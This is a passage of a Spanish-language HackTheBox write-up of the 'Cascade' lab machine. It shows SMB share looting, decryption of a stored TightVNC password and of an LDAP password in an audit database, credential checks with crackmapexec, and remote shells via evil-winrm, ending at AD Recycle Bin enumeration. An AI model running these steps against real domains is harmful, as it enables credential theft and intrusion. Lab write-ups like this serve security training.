+  Logs                                D        0  Tue Jan 28 18:53:04 2020
+  Temp                                D        0  Tue Jan 28 16:06:59 2020
+
+		6553343 blocks of size 4096. 1625081 blocks available
+smb: \IT\&gt;
+</code></pre></div></div>
+<ul>
+<li>Vamos a descargarnos lo que hay.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">smb: \IT\&gt; recurse ON
+smb: \IT\&gt; prompt OFF
+smb: \IT\&gt; mget *
+getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Email Archives/Meeting_Notes_June_2018.html (7.1 KiloBytes/sec) (average 7.1 KiloBytes/sec)
+getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (3.7 KiloBytes/sec) (average 5.4 KiloBytes/sec)
+getting file \IT\Logs\DCs\dcdiag.log of size 5967 as Logs/DCs/dcdiag.log (17.0 KiloBytes/sec) (average 9.3 KiloBytes/sec)
+getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as Temp/s.smith/VNC Install.reg (7.7 KiloBytes/sec) (average 8.9 KiloBytes/sec)
+</code></pre></div></div>
+<ul>
+<li>Podemos ver un al parecer notas de una Reunión pero esta en <code>html</code> vamos a verla desde el navegador.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/cascade/1.png">
+</p>
+
+<ul>
+<li><p>Nos dan esta información <strong>Username is TempAdmin (password is the same as the normal admin account password)</strong>.</p>
+</li>
+<li><p>En la ruta <code>/Temp/s.smith</code> vemos un archivo <code>.reg</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  s.smith cat VNC\ Install.reg
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
+&quot;ExtraPorts&quot;=&quot;&quot;
+&quot;QueryTimeout&quot;=dword:0000001e
+&quot;QueryAcceptOnTimeout&quot;=dword:00000000
+&quot;LocalInputPriorityTimeout&quot;=dword:00000003
+&quot;LocalInputPriority&quot;=dword:00000000
+&quot;BlockRemoteInput&quot;=dword:00000000
+&quot;BlockLocalInput&quot;=dword:00000000
+&quot;IpAccessControl&quot;=&quot;&quot;
+&quot;RfbPort&quot;=dword:0000170c
+&quot;HttpPort&quot;=dword:000016a8
+&quot;DisconnectAction&quot;=dword:00000000
+&quot;AcceptRfbConnections&quot;=dword:00000001
+&quot;UseVncAuthentication&quot;=dword:00000001
+&quot;UseControlAuthentication&quot;=dword:00000000
+&quot;RepeatControlAuthentication&quot;=dword:00000000
+&quot;LoopbackOnly&quot;=dword:00000000
+&quot;AcceptHttpConnections&quot;=dword:00000001
+&quot;LogLevel&quot;=dword:00000000
+&quot;EnableFileTransfers&quot;=dword:00000001
+&quot;RemoveWallpaper&quot;=dword:00000001
+&quot;UseD3D&quot;=dword:00000001
+&quot;UseMirrorDriver&quot;=dword:00000001
+&quot;EnableUrlParams&quot;=dword:00000001
+&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
+&quot;AlwaysShared&quot;=dword:00000000
+&quot;NeverShared&quot;=dword:00000000
+&quot;DisconnectClients&quot;=dword:00000001
+&quot;PollingInterval&quot;=dword:000003e8
+&quot;AllowLoopback&quot;=dword:00000000
+&quot;VideoRecognitionInterval&quot;=dword:00000bb8
+&quot;GrabTransparentWindows&quot;=dword:00000001
+&quot;SaveLogToAllUsersPath&quot;=dword:00000000
+&quot;RunControlInterface&quot;=dword:00000001
+&quot;IdleTimeout&quot;=dword:00000000
+&quot;VideoClasses&quot;=&quot;&quot;
+&quot;VideoRects&quot;=&quot;&quot;
+</code></pre></div></div>
+<ul>
+<li>Esta línea es interesante <a href="https://www.geeknetic.es/VNC/que-es-y-para-que-sirve">https://www.geeknetic.es/VNC/que-es-y-para-que-sirve</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
+</code></pre></div></div>
+<ul>
+<li><p>Aquí encontramos información donde nos dicen como podemos ver la contraseña en texto plano <a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>.</p>
+</li>
+<li><p>Encontramos esta herramienta <a href="https://github.com/jeroennijhof/vncpwd">https://github.com/jeroennijhof/vncpwd</a>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  /opt sudo git clone https://github.com/jeroennijhof/vncpwd
+[sudo] password for miguel:
+Cloning into 'vncpwd'...
+remote: Enumerating objects: 28, done.
+remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28
+Receiving objects: 100% (28/28), 22.15 KiB | 290.00 KiB/s, done.
+Resolving deltas: 100% (9/9), done.
+➜  /opt cd vncpwd
+➜  vncpwd sudo gcc -o vncpwd vncpwd.c d3des.c
+</code></pre></div></div>
+<ul>
+<li>Vamos a pasar los caracteres o la string a un archivo pero la vamos a guardar en formato binario ya que la contraseña codificada corresponde para un servidor VNC.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  s.smith echo '6bcf2a4b6e5aca0f' | xxd -r -p &gt; vnc_pass
+</code></pre></div></div>
+<ul>
+<li>Ahora ya podemos usar la herramienta y ver la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  s.smith /opt/vncpwd/vncpwd vnc_pass
+Password: sT333ve2
+</code></pre></div></div>
+<ul>
+<li>En el repositorio de GitHub también nos dicen que podemos usar <code>Metasploit</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  s.smith msfconsole
+Metasploit tip: Search can apply complex filters such as search cve:2009
+type:exploit, see all the filters with help search
+
+
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      '7$$$$\&quot;&quot;&quot;&quot;''^^`` .7$$$|D*&quot;'```         ?88'
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*&quot;`   d8P       ?8b  88P
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*&quot;`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*&quot; ?88,.d88b, d88 d8P' ?88 88P `?8b
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*&quot;`    `?88'  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$&quot;`          88b  d8P  88b`?8888P'
+                       ,s$$$$$$$&quot;`             888888P'   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--&quot;&quot;''^^/$$$$$$'
+_______________________________________________________________   ,&amp;$$$$$$'_____
+                                                                 ll&amp;&amp;$$$$'
+                                                              .;;lll&amp;&amp;&amp;&amp;'
+                                                            ...;;lllll&amp;'
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+
+
+       =[ metasploit v6.4.2-dev                           ]
++ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; irb
+[*] Starting IRB shell...
+[*] You are in the &quot;framework&quot; object
+
+irb: warn: can't alias jobs from irb_jobs.
+&gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;
+=&gt; &quot;\x17Rk\x06#NX\a&quot;
+&gt;&gt; require 'rex/proto/rfb'
+=&gt; true
+&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6bcf2a4b6e5aca0f&quot;].pack('H*'), fixedkey
+=&gt; &quot;sT333ve2&quot;
+</code></pre></div></div>
+<h2 id="user-txt">User txt</h2>
+<ul>
+<li>Ahora comprobamos las credenciales al estar en el directorio <code>s.smith</code> le corresponden a ese usuario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  s.smith crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
+</code></pre></div></div>
+<ul>
+<li>Ahora ya nos podemos conectar con <code>evil-winrm</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  s.smith evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; whoami
+cascade\s.smith
+*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type C:\Users\s.smith\Desktop\user.txt
+8b885675a5366ad864fed27bc2c8f4ed
+</code></pre></div></div>
+<h2 id="arksvc">arksvc</h2>
+<ul>
+<li>No vemos nada interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div></div>
+<ul>
+<li>El usuario pertenece al grupo <code>Audit Share</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; net user s.smith
+User name                    s.smith
+Full Name                    Steve Smith
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/28/2020 8:58:05 PM
+Password expires             Never
+Password changeable          1/28/2020 8:58:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script                 MapAuditDrive.vbs
+User profile
+Home directory
+Last logon                   1/29/2020 12:26:39 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Audit Share          *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+</code></pre></div></div>
+<ul>
+<li>Solamente nosotros somos miembros de ese grupo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; net localgroup &quot;Audit Share&quot;
+Alias name     Audit Share
+Comment        \\Casc-DC1\Audit$
+
+Members
+
+-------------------------------------------------------------------------------
+s.smith
+The command completed successfully.
+</code></pre></div></div>
+<ul>
+<li>Vemos que hay otro usuario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users&gt; dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/25/2020  11:17 AM                Administrator
+d-----        1/28/2020  11:37 PM                arksvc
+d-r---        7/14/2009   5:57 AM                Public
+d-----        1/15/2020  10:22 PM                s.smith
+</code></pre></div></div>
+<ul>
+<li>No vemos nada interesante así vamos a ver recursos compartidos por <code>smb</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.10.10.182 -u s.smith -p sT333ve2 --shares
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
+SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
+SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
+SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
+SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.10.10.182    445    CASC-DC1         Audit$          READ
+SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
+SMB         10.10.10.182    445    CASC-DC1         Data            READ
+SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
+SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
+</code></pre></div></div>
+<ul>
+<li>Vamos a conectarnos a <code>Audit$</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content smbclient //10.10.10.182/Audit$ -U s.smith%sT333ve2
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Jan 29 12:01:26 2020
+  ..                                  D        0  Wed Jan 29 12:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 15:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 12:00:20 2020
+  DB                                  D        0  Tue Jan 28 15:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 17:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 01:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 01:38:38 2019
+  x64                                 D        0  Sun Jan 26 16:25:27 2020
+  x86                                 D        0  Sun Jan 26 16:25:27 2020
+
+		6553343 blocks of size 4096. 1624921 blocks available
+smb: \&gt;
+</code></pre></div></div>
+<ul>
+<li>Vamos a descargarnos todo eso.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">smb: \&gt; prompt OFF
+smb: \&gt; recurse ON
+smb: \&gt; mget *
+getting file \CascAudit.exe of size 13312 as CascAudit.exe (30.7 KiloBytes/sec) (average 30.7 KiloBytes/sec)
+getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (34.6 KiloBytes/sec) (average 32.4 KiloBytes/sec)
+getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 22.5 KiloBytes/sec)
+getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (444.3 KiloBytes/sec) (average 198.7 KiloBytes/sec)
+getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (130.5 KiloBytes/sec) (average 169.9 KiloBytes/sec)
+getting file \DB\Audit.db of size 24576 as DB/Audit.db (70.6 KiloBytes/sec) (average 160.7 KiloBytes/sec)
+getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (1431.2 KiloBytes/sec) (average 458.7 KiloBytes/sec)
+getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (923.0 KiloBytes/sec) (average 559.3 KiloBytes/sec)
+</code></pre></div></div>
+<ul>
+<li>Si vemos el archivo <code>.bat</code> lo único que hace es correr el binario y pone la información en un <code>.db</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat RunAudit.bat
+CascAudit.exe &quot;\\CASC-DC1\Audit$\DB\Audit.db&quot;
+</code></pre></div></div>
+<ul>
+<li>Vamos a ver el <code>.db</code> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  DB file Audit.db
+Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
+</code></pre></div></div>
+<ul>
+<li>Podemos <code>dumpear</code> la información usando <code>sqlite3</code> comenzamos por las tablas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  DB sqlite3 Audit.db
+SQLite version 3.45.1 2024-01-30 16:01:20
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .tables
+DeletedUserAudit  Ldap              Misc
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a ver lo que contienen las tablas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">qlite&gt; select * from DeletedUserAudit;
+6|test|Test
+DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
+7|deleted|deleted guy
+DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
+9|TempAdmin|TempAdmin
+DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
+sqlite&gt; select * from Ldap;
+1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
+sqlite&gt; select * from Misc;
+</code></pre></div></div>
+<ul>
+<li><p>No vemos nada interesante.</p>
+</li>
+<li><p>Vamos a pasar el binario a una maquina Windows para examinarlo con <code>DNSpy</code> <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content file CascAudit.exe
+CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+</code></pre></div></div>
+<ul>
+<li>En esta parte del código encontramos una contraseña.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/cascade/code.png">
+</p>
+
+<ul>
+<li><p>La <code>key</code> se utiliza al momento de cifrar la contraseña <code>c4scadek3y654321</code>.</p>
+</li>
+<li><p>Si vemos allí llama ala <code>dll</code>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/cascade/code2.png">
+</p>
+
+<ul>
+<li><p>Vamos a debugear el <code>dll</code> ya que allí se hace lo del proceso de cifrar la contraseña.</p>
+</li>
+<li><p>Podemos ver el <code>DefaultIV</code> <code>1tdyjCbY1Ix49842</code> además de saber que se usa  <code>CipherMode.CBC</code> .</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/cascade/ex.png">
+</p>
+
+<ul>
+<li><p>La password es la que encontramos en el sqlite3 <code>1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local</code>.</p>
+</li>
+<li><p>Si le pasamos lo que nos pide hacer el <code>decrypt</code> <code>w3lc0meFr31nd</code> nos da la contraseña en texto plano.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/cascade/pass.png">
+</p>
+
+<ul>
+<li>Si vemos si las credenciales son correctas vemos que si.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami
+cascade\arksvc
+*Evil-WinRM* PS C:\Users\arksvc\Documents&gt;
+</code></pre></div></div>
+<ul>
+<li>Estamos en el grupo <code>AD Recycle Bin</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; net user arksvc
+User name                    arksvc
+Full Name                    ArkSvc
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2020 5:18:20 PM
+Password expires             Never
+Password changeable          1/9/2020 5:18:20 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/29/2020 10:05:40 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *AD Recycle Bin       *IT
+                             *Remote Management Use
+Global Group memberships     *Domain Users
+The command completed successfully.
+</code></pre></div></div>
+<blockquote>
+<p>Cuando la Papelera de Reciclaje de AD está habilitada, los objetos de Active Directory que son eliminados no se eliminan de forma permanente de inmediato. En lugar de eso, pasan a un estado denominado &quot;logical delete&quot; o eliminación lógica. Durante este período, los objetos pueden ser restaurados completamente, incluyendo todos sus atributos y configuraciones de seguridad anteriores, como si nunca hubiesen sido eliminados.</p>
+</blockquote>
+<ul>
+<li><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/</a>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/cascade/chota.png">
+</p>
+
+<ul>
+<li>Con este comando podemos ver objetos borrados.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; Get-ADObject -filter 'isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;' -includeDeletedObjects
+
+
+Deleted           : True
+DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
+Name              : CASC-WS1
+                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
+ObjectClass       : computer
+ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
+
+Deleted           : True
